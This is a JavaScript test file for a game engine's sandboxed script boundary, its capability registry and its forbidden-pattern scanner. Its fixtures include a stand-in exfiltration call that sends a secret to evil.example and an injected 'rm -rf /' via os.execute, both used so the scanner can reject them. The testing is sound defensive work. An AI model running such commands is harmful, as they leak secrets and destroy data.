/**
 * Script execution boundary + API versioning tests — P4-07, P4-08.
 *
 * The hard termination path is exercised with an injected fake Worker
 * (jsdom has no real Worker); the forbidden-pattern scan and capability
 * registry are pure and tested directly.
 */
import { describe, it, expect, vi } from 'vitest';
import ScriptBoundary from '../src/engine/scripting/ScriptBoundary.js';
import {
  SCRIPT_API_VERSION,
  CAPABILITIES,
  DEFAULT_CAPABILITIES,
  knownCapabilities,
  validateCapabilities,
  createApiAdapter,
  scanScriptForForbidden,
} from '../src/engine/scripting/script-api.js';

// Fixtures ---------------------------------------------------------------
const MALICIOUS_LOOP = 'while true do end'; // infinite loop: contained by time termination
const EXFILTRATION = 'local r = fetch("https://evil.example/steal?c=" .. secret)';
const CODE_INJECTION = 'eval("os.execute(\\"rm -rf /\\")")';
const BENIGN = 'local x = 1 + 2\nlocal t = { hp = 100 }\nreturn t.hp + x';

// Fake worker implementing the message protocol --------------------------
function fakeWorker({ onRun = () => {}, autoRespond = null } = {}) {
  const handlers = {};
  const posted = [];
  const worker = {
    posted,
    terminated: false,
    postMessage: vi.fn(msg => {
      posted.push(msg);
      onRun(msg, reply => worker.onmessage({ data: reply }));
    }),
    terminate: vi.fn(() => {
      worker.terminated = true;
    }),
    set onmessage(fn) {
      handlers.message = fn;
    },
    get onmessage() {
      return handlers.message;
    },
    set onerror(fn) {
      handlers.error = fn;
    },
    // test helper: deliver a message as if from the worker
    __deliver(msg) {
      handlers.message({ data: msg });
    },
  };
  if (autoRespond) {
    const orig = worker.postMessage;
    worker.postMessage = vi.fn(msg => {
      orig(msg);
      if (msg.type === 'run') autoRespond(msg, r => worker.__deliver(r));
    });
  }
  return worker;
}

describe('script-api (P4-08)', () => {
  it('declares a version and capability registry', () => {
    expect(SCRIPT_API_VERSION).toMatch(/^\d+\.\d+\.\d+$/);
    expect(knownCapabilities()).toContain('lib:math');
    expect(knownCapabilities()).toContain('host:fetch');
    expect(DEFAULT_CAPABILITIES).toContain('lib:math');
  });

  it('validates declared capabilities', () => {
    expect(validateCapabilities(['lib:os', 'host:kv'])).toEqual({ ok: true, unknown: [] });
    const bad = validateCapabilities(['lib:os', 'host:mind-control']);
    expect(bad.ok).toBe(false);
    expect(bad.unknown).toEqual(['host:mind-control']);
  });

  it('createApiAdapter is default-deny', () => {
    const bound = {};
    const fakeEnv = { loadLib: (name, value) => (bound[name] = value) };
    const fakeTable = function () {};
    const { granted, denied } = createApiAdapter(fakeEnv, fakeTable, ['lib:os']);
    expect(granted).toContain('lib:os');
    expect(denied).toEqual([]);
    // dangerous libs emptied
    expect(bound.io).toBeInstanceOf(fakeTable);
    expect(bound.debug).toBeInstanceOf(fakeTable);
    expect(bound.package).toBeInstanceOf(fakeTable);
    // default + declared kept (not emptied)
    expect(bound.math).toBeUndefined();
    expect(bound.os).toBeUndefined();
  });

  it('createApiAdapter denies unknown capabilities', () => {
    const fakeEnv = { loadLib: () => {} };
    const { denied } = createApiAdapter(fakeEnv, function () {}, ['host:mind-control']);
    expect(denied).toEqual(['host:mind-control']);
  });
});

describe('scanScriptForForbidden (P4-07)', () => {
  it('passes benign scripts', () => {
    expect(scanScriptForForbidden(BENIGN)).toEqual({ ok: true, hits: [] });
  });

  it('flags exfiltration and code-injection patterns', () => {
    expect(scanScriptForForbidden(EXFILTRATION).ok).toBe(false);
    expect(scanScriptForForbidden(CODE_INJECTION).ok).toBe(false);
    expect(scanScriptForForbidden('import("evil")').ok).toBe(false);
    expect(scanScriptForForbidden('globalThis.secret').ok).toBe(false);
  });

  it('does not flag an infinite loop (handled by time termination, not the scan)', () => {
    // The scan is about ambient capabilities; liveness is the timeout's job.
    expect(scanScriptForForbidden(MALICIOUS_LOOP).ok).toBe(true);
  });
});

describe('ScriptBoundary (P4-07)', () => {
  it('requires a worker factory', () => {
    expect(() => new ScriptBoundary({})).toThrow(/worker factory/);
  });

  it('rejects forbidden scripts without touching the worker', async () => {
    const worker = fakeWorker();
    const b = new ScriptBoundary({ createWorker: () => worker, timeoutMs: 50 });
    const r = await b.execute({ script: EXFILTRATION });
    expect(r.ok).toBe(false);
    expect(r.code).toBe('forbidden');
    expect(worker.postMessage).not.toHaveBeenCalled();
    await b.dispose();
  });

  it('delivers results via the message API', async () => {
    const worker = fakeWorker({
      autoRespond: (msg, reply) => reply({ id: msg.id, type: 'result', value: 42 }),
    });
    const b = new ScriptBoundary({ createWorker: () => worker, timeoutMs: 500 });
    const r = await b.execute({ script: BENIGN });
    expect(r).toEqual({ ok: true, value: 42 });
    expect(worker.postMessage).toHaveBeenCalledWith(
      expect.objectContaining({ type: 'run', script: BENIGN })
    );
    await b.dispose();
  });

  it('terminates a hung script on timeout (malicious-loop containment)', async () => {
    const worker = fakeWorker(); // never responds: simulates `while true do end`
    const b = new ScriptBoundary({ createWorker: () => worker, timeoutMs: 30 });
    const r = await b.execute({ script: MALICIOUS_LOOP });
    expect(r.ok).toBe(false);
    expect(r.code).toBe('timeout');
    expect(worker.terminate).toHaveBeenCalled();
    await b.dispose();
  });

  it('propagates worker errors as typed failures', async () => {
    const worker = fakeWorker({
      autoRespond: (msg, reply) =>
        reply({ id: msg.id, type: 'error', code: 'runtime', message: 'boom' }),
    });
    const b = new ScriptBoundary({ createWorker: () => worker, timeoutMs: 500 });
    const r = await b.execute({ script: BENIGN });
    expect(r).toEqual({ ok: false, code: 'runtime', message: 'boom' });
    await b.dispose();
  });

  it('routes host capability requests to host handlers', async () => {
    const kv = new Map();
    const worker = fakeWorker(); // never auto-responds; the test drives the protocol
    const b = new ScriptBoundary({
      createWorker: () => worker,
      timeoutMs: 500,
      hostHandlers: {
        'host:kv': async (op, key) => {
          if (op === 'get') return kv.get(key) ?? 100;
          throw new Error('unsupported op');
        },
      },
    });
    const runPromise = b.execute({ script: BENIGN, capabilities: ['host:kv'] });
    // wait for the run message, then simulate the worker's capability request
    await new Promise(r => setTimeout(r, 10));
    const runMsg = worker.posted.find(m => m.type === 'run');
    expect(runMsg).toBeTruthy();
    worker.__deliver({
      id: runMsg.id,
      type: 'capability',
      reqId: 'r1',
      name: 'host:kv',
      args: ['get', 'hp'],
    });
    const capResult = await new Promise(resolve => {
      const check = () => {
        const m = worker.posted.find(m => m.type === 'capability-result');
        if (m) resolve(m);
        else setTimeout(check, 5);
      };
      check();
    });
    expect(capResult.ok).toBe(true);
    expect(capResult.value).toBe(100);
    expect(capResult.reqId).toBe('r1');
    // complete the run
    worker.__deliver({ id: runMsg.id, type: 'result', value: 'done' });
    const r = await runPromise;
    expect(r).toEqual({ ok: true, value: 'done' });
    await b.dispose();
  });

  it('denies capabilities with no host handler', async () => {
    const worker = fakeWorker();
    const b = new ScriptBoundary({ createWorker: () => worker, timeoutMs: 200 });
    const p = b.execute({ script: BENIGN, capabilities: ['host:fetch'] });
    await new Promise(r => setTimeout(r, 10));
    const runMsg = worker.posted.find(m => m.type === 'run');
    worker.__deliver({
      id: runMsg.id,
      type: 'capability',
      reqId: 'r9',
      name: 'host:fetch',
      args: ['https://example.com'],
    });
    const capResult = await new Promise(resolve => {
      const check = () => {
        const m = worker.posted.find(m => m.type === 'capability-result');
        if (m) resolve(m);
        else setTimeout(check, 5);
      };
      check();
    });
    expect(capResult.ok).toBe(false);
    expect(capResult.error).toMatch(/no host handler/);
    await b.dispose();
    await p.catch(() => {});
  });

  it('dispose() settles pending runs', async () => {
    const worker = fakeWorker();
    const b = new ScriptBoundary({ createWorker: () => worker, timeoutMs: 5000 });
    const p = b.execute({ script: BENIGN });
    await b.dispose();
    const r = await p;
    expect(r.ok).toBe(false);
    expect(r.code).toBe('disposed');
    expect(worker.terminate).toHaveBeenCalled();
  });
});
